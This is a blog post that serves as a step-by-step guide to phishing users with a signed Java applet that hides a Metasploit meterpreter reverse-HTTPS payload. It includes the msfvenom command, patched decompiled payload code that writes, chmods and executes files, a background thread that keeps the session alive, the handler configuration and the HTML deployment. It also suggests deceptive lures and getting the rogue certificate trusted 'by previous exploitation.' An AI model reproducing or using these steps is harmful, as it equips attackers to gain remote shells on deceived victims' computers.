---
title: Signed Java Applet - Water Hole Attack
layout: post
author: mtr
description: Creating a Signed Java Applet to Phish Users
---

![](/assets/img/signed-java-applet/java_warning.png)

One of the common attack vectors deals with water hole attacks. These attacks are used to tempt users to click on documents, links, and content that will allow execution onto their box. These can take many forms: Microsoft Office macros (Excel, Word), Flash enabled sites, Javascript attacks, and specifically Java signed applets. We’re going to walk you through creating your own java signing certificate (If you don’t have one) and then how to code sign your java applet within NetBeans.

### Create your code signing certificate:

First let’s create your java certificate file.
Make sure you have openssl installed. If you’re on ubuntu:

```
apt-get install openssl
```

Change directory to the openssl:

```
cd /usr/lib/ssl/misc/
```

Execute the CA.sh bash script to create your initital CA authority

```
CA.sh -newca
```

Change directory to the new folder, demoCA

```
cd demoCA
```

Copy the openssl.cnf from the /usr/lib/ssl/ directory and modify usage for the code signing:

```
cp /usr/lib/ssl/openssl.conf .
```

Open openssl.conf and modify the following fields to contain the following values
**Note that a code signing certificate can only be used for code signing**

keyUsage = digitalSignature
extendedKeyUsage = codeSigning

Then modify the dir to operate from in the configuration file to the local directory (still within the openssl.conf)[ CA_default ] From
dir = ./demoCA
To
dir = ./

Create the user request based on the configuration you modified

```
openssl req -new -keyout user.key -out user.req -config
```

Sign the certificate by the CA

```
openssl ca -policy policy_anything -config -out user.pem -infiles user.req
```

Export the certificate in pk12 format.

```
openssl pkcs12 -export -in user.pem -inkey user.key -out user.p12 -name -caname -chain -CAfile ./cacert.pem
```

Convert the CA certificate into pk12 format:

```
openssl pkcs12 -export -out root_cert.pfx -inkey ./private/cakey.pem -in cacert.pem -certfile cacert.pem
```

Convert the user code signing certificate into java jks storage
**Note, make sure you remember the alias used when creating the user certificate. You can view it by executing the following:**

```
keytool -v -list -storetype pkcs12 -keystore user.p12
```

Convert the certificate to jks:

```
keytool -importkeystore -srckeystore user.p12 -srcstoretype pkcs12 -srcalias -destkeystore user.jks -deststoretype jks -deststorepass password -destalias
```

Copy the user.p12 and root_cert.pfx to the systems that will be utilizing the Java applet. Copy the user.jks to the system that will be signing the applet.

Generate the meterpreter jar file
Use your latest Kali VM, use msfvenom in order to create your jar file that you will use to decompile and insert into your java program.

```
msfvenom -p java/meterpreter/reverse_https -f raw LHOST=192.168.1.5 LPORT=443 > java_rhttps.jar
```

Download jd-gui from http://jd.benow.ca/ to decompile the jar.

Export all the sources to a zip file and we will import them into our java project.

![](/assets/img/signed-java-applet/jd-gui.png)

### Creating the signed java applet

Make sure you have the latest Netbeans installed. Create a new project in netbeans. The narrative here is to create a java applet that doesn’t call too much attention to itself, but the victims will still have a reason to click on it. A training requirement, an updated cost schedule, or something that would require them to launch a browser and view the information.

With Netbeans, you can create java fxml projects with are a bit snazzier when it comes to their display. You can spend alot of time creating your java applet, but for the purposes of this post we’ll stick with something simple.

After you’ve got your shell java program, we need to add some code to launch our new thread which will kick off our java meterpreter. This will also be useful so that if the browser or java applet gets closed, our java meterperter will stay running in the background.


```java
Thread athread = new Thread(new Runnable(){
   @Override
   public void run(){
       try{
        Payload.main(new String[0]);
       }
       catch(Exception e){}
   }
});
athread.start();
```

You also need to run your codebase from the context of an applet. Add another class file to run your applet from:

```java
package newProject;
 
import java.applet.Applet;
 
public class webApplet extends Applet{
 public void init() {
 newProject.mainJavaClass.main(null);
 }
}
```

### Importing metasploit java code into applet

Create a new package in your java program, name it “metasploit”. Then copying the source files under the metasploit package you exported from jd-gui, copy the Payload.java and the PayloadTrustManager.java into the this package. You will also need the metasploit.dat file. This needs to be copied into the , which can be done by just drag and dropping it into the “source packages”. It should create the package for you.

![](/assets/img/signed-java-applet/packages_java.png)

You will notice that there are a few syntax errors with this code. I believe this is due to the fact that when jd-gui decompiles the jar file, some of the code isn’t interpreted correctly, and as such you will have to do some spot clean up.

I’ve made a quick list below of the line number and the corrected code that needs to be done.
After all of this is setup, you can now phish users with a signed Java Applet. Make sure that the certificate that was used in the signing is trusted by the users (By previous exploitation and deploying your own root CA, or by using a trusted vendor of code signing).
Note: If you need to clear out the java cache, follow the instructions at https://www.java.com/en/download/help/plugin_cache.xml.

```java
//Line 55
File localObject1 = new File(localFile1.getAbsolutePath() + ".dir");
//Line 56
((File)localObject1).mkdir();
//Line 93 - 100
File[] localObject6a = new File[] { (File)localObject3, ((File)localObject3).getParentFile(), (File)localObject2, (File)localFile3 };
     for (int k = 0; k < localObject6a.length; k++) {
          for (m = 0; (m < 10) && (!localObject6a[k].delete()); m++)
          {
               localObject6a[k].deleteOnExit();
               Thread.sleep(100L);
          }
     }
//Line 114
Runtime.getRuntime().exec(new String[] { "chmod", "+x", (String)localObject1 }).waitFor();
//Line 122
Runtime.getRuntime().exec(new String[] { (String)localObject1 });
//Line 175 - 177
Object[] localObject6b = (Object[])Class.forName("saic.AESEncryption").getMethod("wrapStreams", new Class[] { InputStream.class, OutputStream.class, String.class }).invoke(null, new Object[] { localObject3, localObject4, localObject5 });
localObject3 = (InputStream)localObject6b[0];
localObject4 = (OutputStream)localObject6b[1];
//Line 277
String localObject = localStringTokenizer.nextToken();
```

You can see that most of the issues revolve around the general Object class not being appropriately casted as the required type.
This should fix any errors regarding the metapsloit code.

### Setting up the JKS signing

From the first step above, you converted the code signing certificate into a jks key store file. This is what we will need to generate the signed jar file using netbeans.
Right click your project and goto “Properties”.
Goto Application ->Web Start
Click “Enable Web Start” Checkbox
Change codebase to “No Codebase”

![](/assets/img/signed-java-applet/settings1.png)

Under signing click “Customize”. Select “Sign by a specified key”. Find the jks file under the “Keystore Path”. Type in your keystore password along with your alias name.
For mixed code it should be set to “Enable Software Protections”.

![](/assets/img/signed-java-applet/settings2.png)

After all these settings have been setup, you should be able to run your Java program from Netbeans. You should get your normal java program running along with Metasploit running in the background.

### Setting up msfconsole

From the msfconsole, use the following to catch the java meterpreter:

```
use exploit/multi/handler
set payload java/meterpreter/reverse_https
set lhost IP_Address
set lport 443
set exitonsession false
exploit -j -z
```

### Web Applet Compiling

Now to get it working for web applet. After adding the metasploit codebase to the project, fixing the errors, and testing it, we need to deploy it to the web server.

Compile the latest build for your project and goto the dist directory. Copy all the files there. Should be:

launch.html
launch.jnlp
newProject.jar
README.TXT
Copy these files to your apache2/nginix server. For Apache2, copy these files under /var/www/html. Then create/modify your index.html file with the following content:

```html
<applet id="newProject" width="400" height="800" codebase="http://192.168.1.5" archive="newProject.jar" code="newProject.webApplet">
</applet>
```


After all of this is setup, you can now phish users with a signed Java Applet. Make sure that the certificate that was used in the signing is trusted by the users (By previous exploitation and deploying your own root CA, or by using a trusted vendor of code signing).
Note: If you need to clear out the java cache, follow the instructions at https://www.java.com/en/download/help/plugin_cache.xml.